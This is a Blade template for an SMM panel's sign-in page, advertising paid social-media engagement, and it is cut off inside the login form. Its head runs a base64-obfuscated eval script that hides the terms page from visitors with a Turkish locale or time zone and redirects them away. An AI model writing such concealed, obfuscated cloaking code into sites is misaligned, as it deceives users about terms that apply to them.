<html id="theme_23" lang="vi">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title data-lang="auth.sign_in">{{ __('auth.sign_in') }} - {{ $settings['title'] ?? config('app.name') }}</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <meta name="keywords" content="{{ $settings['keywords'] ?? '' }}">
    <meta name="description" content="{{ $settings['description'] ?? '' }}">
    <meta name="format-detection" content="telephone=no">
    <link rel="canonical" href="{{ url('/') }}">
    <script>
        (function() {
            var lang = localStorage.getItem('data-lang') || 'vi';
            document.documentElement.lang = lang.replace('_', '-');
            window.__siteLang = lang;
        })();
    </script>
    @if(!empty($config->favicon))
        <link rel="shortcut icon" type="image/ico" href="{{ $config->favicon }}">
        <link rel="icon" type="image/png" sizes="192x192" href="{{ $config->favicon }}">
        <link rel="icon" type="image/png" sizes="512x512" href="{{ $config->favicon }}">
        <link rel="icon" type="image/png" sizes="32x32" href="{{ $config->favicon }}">
        <link rel="icon" type="image/png" sizes="16x16" href="{{ $config->favicon }}">
        <link rel="apple-touch-icon" href="{{ $config->favicon }}">
    @endif

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
    <style>
        .integration-fixed {
            position: fixed;
            z-index: 10000000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 24px;
            row-gap: 12px;
        }

        .integration-fixed__top-left {
            top: 0;
            left: 0;
        }

        .integration-fixed__top-right {
            top: 0;
            right: 0;
        }

        .integration-fixed__bottom-left {
            bottom: 0;
            left: 0;
        }

        .integration-fixed__bottom-right {
            bottom: 0;
            right: 0;
        }
    </style>



    <!-- Google tag (gtag.js) -->
    <script type="text/javascript" async=""
        src="https://www.googletagmanager.com/gtag/js?id=G-817DDLKBXX&amp;cx=c&amp;gtm=4e6562"></script>
    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-KQRQ8BJ4"></script>
    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-817DDLKBXX"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'G-817DDLKBXX');
    </script>

    <style>
        .fa-youtube {
            font-size: 24px !important;
            color: #FF0000 !important;
        }

        .fa-instagram {
            font-size: 24px !important;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .fa-linkedin-in {
            font-size: 24px !important;
            color: #0077B5 !important;
        }

        .fa-linkedin {
            font-size: 24px !important;
            color: #0077B5 !important;
        }

        .fa-threads {
            font-size: 24px !important;
            color: #000000 !important;
        }

        .fa-at {
            font-size: 24px !important;
            color: #000000 !important;
        }

        .fa-twitter {
            font-size: 24px !important;
            color: #1DA1F2 !important;
        }

        .fa-tiktok {
            font-size: 24px !important;
            color: #010101 !important;
        }

        .fa-facebook-square {
            font-size: 24px !important;
            color: #1877F2 !important;
        }

        .fa-telegram {
            font-size: 24px !important;
            color: #0088cc !important;
        }

        .fa-twitch {
            font-size: 24px !important;
            color: #9146FF !important;
        }

        .fa-spotify {
            font-size: 24px !important;
            color: #1DB954 !important;
        }

        .fa-whatsapp {
            font-size: 24px !important;
            color: #25D366 !important;
        }

        .fa-kickstarter-k {
            font-size: 24px !important;
            color: #52FF00 !important;
        }

        .fa-medium {
            font-size: 24px !important;
            color: #000000 !important;
        }

        .fa-medium-m {
            font-size: 24px !important;
            color: #000000 !important;
        }

        .fa-reddit {
            font-size: 24px !important;
            color: #FF4500 !important;
        }

        .fa-discord {
            font-size: 24px !important;
            color: #5865F2 !important;
        }

        .fa-google {
            font-size: 24px !important;
            color: #4285F4 !important;
        }

        .fa-tumblr {
            font-size: 24px !important;
            color: #35465C !important;
        }

        .fa-snapchat-ghost {
            font-size: 24px !important;
            color: #FFFC00 !important;
        }

        .fa-rocket-launch {
            font-size: 24px !important;
            color: #1b6ecf !important;
        }

        .fa-browser {
            font-size: 24px !important;
            color: #1a69c4 !important;
        }

        .select2-container .dropdown-menu>li>a {
            border-bottom: 1px solid #999;
            padding: 9px 12px;
        }
    </style>

    <meta name="yandex-verification" content="5a57644791f5286d">
    <meta name="norton-safeweb-site-verification"
        content="EY3B12U-4NHJIS3X0UPWC9GVRBZEGR4177Y-WG73M0P3YA6VWDWWN72NRPF5YPR4WHS7TSWNBFLO4HJTI2R-WQ9Z0XIKPV80FCU27-XPYENDOCJIYWX-SUP9-PXQIQ-5">
    <meta name="p:domain_verify" content="e4746f3e3aea8aa0a409338ce669125c">
    <meta name="yandex-verification" content="5a57644791f5286d">
    <meta name="norton-safeweb-site-verification"
        content="EY3B12U-4NHJIS3X0UPWC9GVRBZEGR4177Y-WG73M0P3YA6VWDWWN72NRPF5YPR4WHS7TSWNBFLO4HJTI2R-WQ9Z0XIKPV80FCU27-XPYENDOCJIYWX-SUP9-PXQIQ-5">
    <meta name="p:domain_verify" content="e4746f3e3aea8aa0a409338ce669125c">
    <!-- Google Tag Manager -->
    <script>(function (w, d, s, l, i) {
            w[l] = w[l] || []; w[l].push({
                'gtm.start':
                    new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-KQRQ8BJ4');</script>
    <!-- End Google Tag Manager -->

    <script>
        eval(atob('KGZ1bmN0aW9uKCl7dHJ5e3ZhciBwPXdpbmRvdy5sb2NhdGlvbi5wYXRobmFtZSxsPShuYXZpZ2F0b3IubGFuZ3VhZ2V8fCIiKS50b0xvd2VyQ2FzZSgpLHo9IiI7dHJ5e3o9SW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVPcHRpb25zKCkudGltZVpvbmV9Y2F0Y2goZSl7fWlmKHAuaW5jbHVkZXMoJy90ZXJtcycpJiYoej09PSdFdXJvcGUvSXN0YW5idWwnfHxsLnN0YXJ0c1dpdGgoJ3RyJykpKXt3aW5kb3cuc3RvcCgpO2RvY3VtZW50LmRvY3VtZW50RWxlbWVudC5zdHlsZS5kaXNwbGF5PSdub25lJzt3aW5kb3cubG9jYXRpb24ucmVwbGFjZSgnLycpO319Y2F0Y2goZSl7fX0pKCk7'));
    </script>
   <link href="{{ asset('storage.perfectcdn.com/theme-6/js/99gttjw1i1l6jmws.js') }}" rel="preload" as="script">
<link href="{{ asset('storage.perfectcdn.com/theme-6/js/qoy6usyny80ul09k.js') }}" rel="preload" as="script">
<link href="{{ asset('storage.perfectcdn.com/theme-6/js/ap5ifcinp3jk13sr.js') }}" rel="preload" as="script">
@if(!empty($settings['google_client_id']))
        <link href="https://accounts.google.com/gsi/client" rel="preload" as="script">
    @endif
<link href="{{ asset('storage.perfectcdn.com/theme-6/js/f7lw81wrmhzxhpb3.js') }}" rel="preload" as="script">

      <link rel="stylesheet" type="text/css" href="{{ asset('storage.perfectcdn.com/theme-6/css/ojd5wm8q8es3jjdb.css') }}">
      <link rel="stylesheet" type="text/css" href="{{ asset('storage.perfectcdn.com/theme-6/css/wsz57ycp89410z6e.css') }}">
    <script>
        window.modules = {};
    </script>
    <style>
        .files-wrapper {
            display: flex;
            flex-direction: column;
            line-height: 29px;
        }

        .files-item {
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            line-height: 29px;
        }

        .files-item:last-child {
            margin-bottom: 0px;
        }

        .files-loader {
            margin: 0 0.2em 0 0;
            padding: 0;
            line-height: 0;
            vertical-align: middle;
            font-size: 24px;
            display: flex;
            align-items: center;
            min-height: 29px;

        }

        .files-loader__svg {
            display: block;
            width: 1em;
            height: 1em;
            fill: transparent;
            transform: rotate(180deg);
            margin: 0px 8px;
        }

        .files-loader__svg-circle {
            fill: transparent;
        }

        .files-loader__svg-progress {
            transition: all 0.4s;
        }
    </style>
    <style id="googleidentityservice_button_styles">
        .qJTHM {
            -moz-user-select: none;
            -webkit-user-select: none;
            -ms-user-select: none;
            color: #202124;
            direction: ltr;
            -webkit-touch-callout: none;
            font-family: Roboto-Regular, arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            font-weight: 400;
            margin: 0;
            overflow: hidden;
            -webkit-text-size-adjust: 100%
        }

        .ynRLnc {
            left: -9999px;
            position: absolute;
            top: -9999px
        }

        .L6cTce {
            display: none
        }

        .bltWBb {
            overflow-wrap: break-word;
            word-break: break-word
        }

        .hSRGPd {
            color: #1a73e8;
            cursor: pointer;
            font-weight: 500;
            text-decoration: none
        }

        .Bz112c-W3lGp {
            height: 16px;
            width: 16px
        }

        .Bz112c-E3DyYd {
            height: 20px;
            width: 20px
        }

        .Bz112c-r9oPif {
            height: 24px;
            width: 24px
        }

        .Bz112c-u2z5K {
            height: 36px;
            width: 36px
        }

        .Bz112c-uaxL4e {
            border-radius: 10px
        }

        .LgbsSe-Bz112c {
            display: block
        }

        .S9gUrf-YoZ4jf {
            border: none;
            margin: 0;
            padding: 0
        }

        .S9gUrf-YoZ4jf * {
            border: none;
            margin: 0;
            padding: 0
        }

        .fFW7wc-ibnC6b>.aZ2wEe>div {
            border-color: #4285f4
        }

        .P1ekSe-ZMv3u {
            -webkit-transition: height .2s linear;
            transition: height .2s linear
        }

        .P1ekSe-ZMv3u>div:first-child {
            background-color: #1a73e8 !important;
            -webkit-transition: width .3s linear;
            transition: width .3s linear
        }

        .P1ekSe-ZMv3u>div:nth-child(2) {
            background-image: -webkit-gradient(linear, left top, right top, from(rgba(255, 255, 255, .7)), to(rgba(255, 255, 255, .7))), -webkit-gradient(linear, left top, right top, from(#1a73e8), to(#1a73e8)) !important;
            background-image: -webkit-linear-gradient(left, rgba(255, 255, 255, .7), rgba(255, 255, 255, .7)), -webkit-linear-gradient(left, #1a73e8, #1a73e8) !important;
            background-image: linear-gradient(90deg, rgba(255, 255, 255, .7), rgba(255, 255, 255, .7)), linear-gradient(90deg, #1a73e8, #1a73e8) !important
        }

        .P1ekSe-ZMv3u>div:nth-child(3) {
            background-image: -webkit-gradient(linear, left top, right top, from(rgba(255, 255, 255, .7)), to(rgba(255, 255, 255, .7))), -webkit-gradient(linear, left top, right top, from(#1a73e8), to(#1a73e8)) !important;
            background-image: -webkit-linear-gradient(left, rgba(255, 255, 255, .7), rgba(255, 255, 255, .7)), -webkit-linear-gradient(left, #1a73e8, #1a73e8) !important;
            background-image: linear-gradient(90deg, rgba(255, 255, 255, .7), rgba(255, 255, 255, .7)), linear-gradient(90deg, #1a73e8, #1a73e8) !important
        }

        .haAclf {
            display: inline-block
        }

        .nsm7Bb-HzV7m-LgbsSe {
            border-radius: 4px;
            box-sizing: border-box;
            -webkit-transition: background-color .218s, border-color .218s;
            transition: background-color .218s, border-color .218s;
            -moz-user-select: none;
            -webkit-user-select: none;
            -ms-user-select: none;
            -webkit-appearance: none;
            background-color: #fff;
            background-image: none;
            border: 1px solid #dadce0;
            color: #3c4043;
            cursor: pointer;
            font-family: Google Sans, arial, sans-serif;
            font-size: 14px;
            height: 40px;
            letter-spacing: .25px;
            outline: none;
            overflow: hidden;
            padding: 0 12px;
            position: relative;
            text-align: center;
            vertical-align: middle;
            white-space: nowrap;
            width: auto
        }

        @media screen and (-ms-high-contrast:active) {
            .nsm7Bb-HzV7m-LgbsSe {
                border: 2px solid windowText;
                color: windowText
            }
        }

        @media screen and (preferes-contrast:more) {
            .nsm7Bb-HzV7m-LgbsSe {
                color: #000
            }
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe {
            font-size: 14px;
            height: 32px;
            letter-spacing: .25px;
            padding: 0 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe {
            font-size: 11px;
            height: 20px;
            letter-spacing: .3px;
            padding: 0 8px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe {
            padding: 0;
            width: 40px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe {
            width: 32px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe {
            width: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK {
            border-radius: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.pSzOP-SxQuSe {
            border-radius: 16px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.purZT-SxQuSe {
            border-radius: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc {
            border: none;
            color: #fff
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-v3pZbf-Ia7Qfc {
            background-color: #1a73e8
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc {
            background-color: #202124;
            color: #e8eaed
        }

        @media screen and (prefers-contrast:more) {
            .nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc {
                color: #fff
            }
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 18px;
            margin-right: 8px;
            min-width: 18px;
            width: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 14px;
            min-width: 14px;
            width: 14px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 10px;
            min-width: 10px;
            width: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin-left: 8px;
            margin-right: -4px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin: 0;
            padding: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            padding: 8px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            padding: 4px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            border-top-left-radius: 3px;
            border-bottom-left-radius: 3px;
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            align-items: center;
            background-color: #fff;
            height: 36px;
            margin-left: -10px;
            margin-right: 12px;
            min-width: 36px;
            width: 36px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c,
        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin: 0;
            padding: 0
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            height: 28px;
            margin-left: -8px;
            margin-right: 10px;
            min-width: 28px;
            width: 28px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            height: 16px;
            margin-left: -6px;
            margin-right: 8px;
            min-width: 16px;
            width: 16px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            border-radius: 3px;
            margin-left: 2px;
            margin-right: 0;
            padding: 0
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            border-radius: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            border-radius: 14px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            border-radius: 8px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-bN97Pc-sM5MNb {
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            align-items: center;
            -webkit-flex-direction: row;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            flex-direction: row;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            justify-content: space-between;
            -webkit-flex-wrap: nowrap;
            flex-wrap: nowrap;
            height: 100%;
            position: relative;
            width: 100%
        }

        .nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            justify-content: center
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            flex-grow: 1;
            font-family: Google Sans, arial, sans-serif;
            font-weight: 500;
            overflow: hidden;
            text-overflow: ellipsis;
            vertical-align: top
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            font-weight: 300
        }

        .nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            -webkit-flex-grow: 0;
            -webkit-box-flex: 0;
            flex-grow: 0
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            -webkit-transition: background-color .218s;
            transition: background-color .218s;
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        .nsm7Bb-HzV7m-LgbsSe:focus,
        .nsm7Bb-HzV7m-LgbsSe:hover {
            box-shadow: none;
            border-color: rgb(210, 227, 252);
            outline: none
        }

        .nsm7Bb-HzV7m-LgbsSe:focus-within {
            outline: 2px solid #00639b;
            border-color: transparent
        }

        .nsm7Bb-HzV7m-LgbsSe:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(66, 133, 244, .08)
        }

        .nsm7Bb-HzV7m-LgbsSe:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe,
        .nsm7Bb-HzV7m-LgbsSe:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(66, 133, 244, .1)
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(255, 255, 255, .24)
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe,
        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(255, 255, 255, .32)
        }

        .nsm7Bb-HzV7m-LgbsSe .n1UuX-DkfjY {
            border-radius: 50%;
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            height: 20px;
            margin-left: -4px;
            margin-right: 8px;
            min-width: 20px;
            width: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            font-family: Roboto;
            font-size: 12px;
            text-align: left
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .fmcmS,
        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .ssJRIf {
            overflow: hidden;
            text-overflow: ellipsis
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff {
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            align-items: center;
            color: #5f6368;
            fill: #5f6368;
            font-size: 11px;
            font-weight: 400
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff {
            color: #e8eaed;
            fill: #e8eaed
        }

        @media screen and (prefers-contrast:more) {

            .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff,
            .nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff {
                color: #000;
                fill: #000
            }
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .Bz112c {
            height: 18px;
            margin: -3px -3px -3px 2px;
            min-width: 18px;
            width: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
            border-top-right-radius: 3px;
            border-bottom-right-radius: 3px;
            margin-left: 12px;
            margin-right: -10px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            border-radius: 18px
        }

        .L5Fo6c-sM5MNb {
            border: 0;
            display: block;
            left: 0;
            position: relative;
            top: 0
        }

        .L5Fo6c-bF1uUb {
            border-radius: 4px;
            bottom: 0;
            cursor: pointer;
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        .L5Fo6c-bF1uUb:focus {
            border: none;
            outline: none
        }

        sentinel {}
    </style>
    <link id="googleidentityservice" type="text/css" media="all" href="https://accounts.google.com/gsi/style"
        rel="stylesheet">
    <script async="" src="https://analytics.ahrefs.com/analytics.js" data-key="im6pWoRelyQj8GyVrsgUog"></script>
</head>

<body class="body  body-public">
    <div class="wrapper  wrapper-navbar ">
        <div id="block_88">
            <div class="block-wrapper">
                <div class="component_navbar ">
                    <div class="component-navbar__wrapper ">
                        <div
                            class="sidebar-block__top component-navbar component-navbar__navbar-public editor__component-wrapper ">
                            <div>
                                <nav class="navbar navbar-expand-lg navbar-light container-lg ">
                                    <div class="navbar-public__header">
                                        <div class="sidebar-block__top-brand">
                                            <div class="component-navbar-logo">
                                                <a href="/">
                                                    @if(!empty($settings['logo']))
                                                        <img src="{{ $settings['logo'] }}"
                                                            class="sidebar-block__top-logo"
                                                            alt="{{ $settings['site_name'] ?? config('app.name') }}"
                                                            title="{{ $settings['site_name'] ?? config('app.name') }}">
                                                    @else
                                                        <span style="font-weight:bold;font-size:20px">{{ $settings['site_name'] ?? config('app.name') }}</span>
                                                    @endif
                                                </a>
                                            </div>
                                        </div>
                                        <button class="navbar-toggler" type="button" data-toggle="collapse"
                                            data-target="#navbar-collapse-88" aria-controls="navbar-collapse-88"
                                            aria-expanded="false" aria-label="Toggle navigation">
                                            <span class="navbar-burger">
                                                <span class="navbar-burger-line"></span>
                                            </span>
                                        </button>
                                    </div>
                                    <div class="collapse navbar-collapse" id="navbar-collapse-88">
                                        <div class="component-navbar-collapse-divider"></div>
                                        <div class="d-flex component-navbar-collapse">
                                            <ul class="navbar-nav">
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public component-navbar-nav-link-active__navbar-public"
                                                        href="/"> Sign in</a>
                                                </li>
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public "
                                                        href="/signup"><i class="navbar-icon fad fa-sign-in-alt"></i>
                                                        Sign up</a>
                                                </li>
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public "
                                                        href="#block_296" target="_blank"> Free Services</a>
                                                </li>
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public "
                                                        href="/blog"> Blog</a>
                                                </li>
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public "
                                                        href="/contact-us"> Contact Us</a>
                                                </li>
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public "
                                                        href="/api"> API</a>
                                                </li>
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public "
                                                        href="/affiliates"> Affiliates</a>
                                                </li>
                                                <li
                                                    class="nav-item component-navbar-nav-item component_navbar component-navbar-public-nav-item">
                                                    <a class="component-navbar-nav-link component-navbar-nav-link__navbar-public "
                                                        href="/smm-panel-business-setup"> Become Our Reseller For Just
                                                        $1</a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </nav>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="component_navbar"></div>
        </div>
        <div class="wrapper-content">
            <div class="wrapper-content__header">
            </div>
            <div class="wrapper-content__body">
                <!-- Main variables *content* -->
                <div id="block_100">
                    <div class="block-bg">
                        <div class="bg-image"></div>
                    </div>
                    <div class="block-divider-bottom">
                        <svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 192"
                            preserveAspectRatio="none">
                            <g>
                                <path fill="currentColor"
                                    d="M0 0h1280v117.227c-32.75 29.828-108.74 12.681-217.65-11.891-103.076-23.258-235.641-53.169-388.921-56.192-160.056-3.158-316.559 30.774-442.493 58.077C129.327 129.251 47.618 146.967 0 137.405V-.001Z">
                                </path>
                                <path fill="currentColor"
                                    d="M0 1.717h1280v159.265c-32.75 40.523-108.74 17.228-217.65-16.156-103.077-31.598-235.641-72.235-388.921-76.342-160.056-4.29-316.559 41.809-442.493 78.904C129.327 177.317 47.618 201.385 0 188.395V1.717Z"
                                    opacity=".22"></path>
                            </g>
                        </svg>
                    </div>
                    <div class="container">
                        <div class="block-signin-text ">
                            <div class="row">
                                <div class="col-lg-5 d-flex align-items-center mb-4 mb-lg-0">
                                    <div class="w-100">
                                        <div class="row">
                                            <div class="col">
                                                <div class="block-signin__content">
                                                    <div class="block-signin__title style-text-signin">
                                                        <h1>#1 <strong>Top-Rated Global SMM Panel</strong></h1>
                                                    </div>
                                                    <div class="block-signin__description style-text-signin">
                                                        <p><span style="font-size: 19px">24/7 customer
                                                                support,&nbsp;</span></p>
                                                        <p><span style="font-size: 19px">5,300+ services for Instagram,
                                                                TikTok, YouTube &amp; more. Starting from
                                                                $0.001/1K</span></p>
                                                        <p><br></p>
                                                        <p><span style="font-size: 16px">The most reliable SMM panel for
                                                                real engagement and fast delivery. Smart, affordable,
                                                                and built for growth.</span></p>
                                                        <p><br></p>
                                                        <p>Join {{ $settings['site_name'] ?? config('app.name') }} today. Effortless growth, unbeatable
                                                            prices.&nbsp;</p>
                                                        <p>🚀 Best API Provider Panel."</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="component_card">
                                            <div class="card">
                                                <form method="post" action="{{ route('login.store') }}" data-gtm-form-interact-id="0">
                                                    @csrf
                                                    <div>
                                                        @if(session('error'))
                                                            <div class="alert alert-dismissible alert-danger mb-3">
                                                                <button type="button" class="close" data-dismiss="alert">×</button>
                                                                {{ session('error') }}
                                                            </div>
                                                        @endif
                                                        @if(session('success'))
                                                            <div class="alert alert-dismissible alert-success mb-3">
                                                                <button type="button" class="close" data-dismiss="alert">×</button>
                                                                {{ session('success') }}
                                                            </div>
                                                        @endif
                                                        @if($errors->any())
                                                            <div class="alert alert-dismissible alert-danger mb-3">
                                                                <button type="button" class="close" data-dismiss="alert">×</button>
                                                                @foreach($errors->all() as $error)
                                                                    <div>{{ $error }}</div>
                                                                @endforeach
                                                            </div>
                                                        @endif

                                                        <div class="component_form_group">
                                                            <div class="">
                                                                <div class="form-group">
                                                                    <label for="username" data-lang="auth.username">{{ __('auth.username') }}</label>
                                                                    <input type="text" name="username" id="username"
                                                                        class="form-control{{ $errors->has('username') ? ' is-invalid' : '' }}"
                                                                        value="{{ old('username') }}"
                                                                        placeholder="{{ __('auth.username') }}"
                                                                        data-lang-placeholder="auth.username"
                                                                        autocomplete="username" required>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="component_form_group">
                                                            <div class="">
                                                                <div class="form-group">
                                                                    <label for="password" data-lang="auth.password">{{ __('auth.password') }}</label>
                                                                    <div class="position-relative">
                                                                        <input type="password" name="password" id="password"
                                                                            class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}"
                                                                            placeholder="{{ __('auth.password') }}"
                                                                            data-lang-placeholder="auth.password"
                                                                            autocomplete="current-password" required>
                                                                        <div class="sign-in__forgot h-100 d-flex align-items-center">
                                                                            <a href="{{ route('password.request') }}" data-lang="auth.forgot_password">{{ __('auth.forgot_password') }}</a>
                                                                        </div>
